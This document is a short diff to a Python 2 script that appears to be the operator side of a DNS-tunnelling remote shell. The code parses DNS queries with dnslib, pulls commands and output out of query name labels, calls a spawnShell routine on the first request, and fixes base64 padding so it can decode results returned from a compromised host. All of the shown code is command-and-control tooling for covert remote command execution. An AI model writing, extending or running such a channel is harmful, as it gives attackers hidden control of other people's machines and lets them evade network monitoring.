@@ -22,6 +22,12 @@ def main():
   print 'Waiting for Request .... \n'
 
   try:
+    data, addr = udps.recvfrom(1024)
+    dnsD = dnslib.DNSRecord.parse(data)
+    payload = dnsD.questions[0].qname.label[0]
+    a = dnsD.reply()
+    a = spawnShell(a, payload)
+    udps.sendto(a.pack(), addr)
     while 1:
       data, addr = udps.recvfrom(1024)
       dnsD = dnslib.DNSRecord.parse(data)
@@ -29,7 +35,13 @@ def main():
       a = dnsD.reply()
       if (payload == NXT_CMD):
         try:
-          print '{}'.format(base64.b64decode(''.join(cmd_list)))
+          # Check for '-'
+          b64Cmd = ''.join(cmd_list)
+          if b64Cmd[3] == '-':
+            b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
+          elif b64Cmd[1] == '-':
+            b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
+          print '{}'.format(base64.b64decode(b64Cmd))
         except:
           # Base64 Decode Failed.
           print '[ERROR]: Couldn\'t Read Result from Host!'
